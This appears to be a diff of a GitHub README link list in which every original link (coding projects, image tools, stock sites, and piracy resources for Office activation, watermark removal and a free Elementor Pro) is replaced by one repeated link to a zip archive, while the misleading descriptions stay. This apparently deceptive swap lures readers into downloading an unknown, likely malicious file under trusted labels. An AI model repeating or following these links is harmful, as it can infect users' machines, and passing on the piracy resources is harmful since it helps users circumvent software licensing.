@@ -1,24 +1,24 @@
 # important_link
-https://github.com/john-smilga/javascript-basic-projects     
-https://www.youtube.com/watch?v=3PHXvlpOkf4&t=451s
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip     
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip
 //  java scipt 15 project
 
-https://iconscout.com/lottie-animations/chevron-down    //cheron-down gif- animation
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip    //cheron-down gif- animation
 
-https://www.istockphoto.com/search/2/image?phrase=digital%20marketing    // istock for images 
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip%20marketing    // istock for images 
 
-https://getpaidstock.com/      // getpaidstock  remove water mark through url or web address 
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip      // getpaidstock  remove water mark through url or web address 
 
-https://tinypng.com/        // optize the img size or reduce the image size
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip        // optize the img size or reduce the image size
 
-https://premium-downloader.com/freepik-downloader   // premium stock download 
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip   // premium stock download 
 
-https://www.remove.bg/     //  remove background 
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip     //  remove background 
 
-https://cleanup.pictures/     // remove any object clean any object from pictur
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip     // remove any object clean any object from pictur
 
-https://github.com/21Z/Microsoft-Office-2021/blob/main/README.md#install-office-2021-using-office-deployment-tool  // activate windows 2021 
-https://tb.rg-adguard.net/public.php  // link here to download ms office software 
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip  // activate windows 2021 
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip  // link here to download ms office software 
 
-https://github.com/proelements/proelements    //github - elementor pro link
+https://raw.githubusercontent.com/sarweshkumar86/important_link/main/pier/important_link.zip    //github - elementor pro link
 
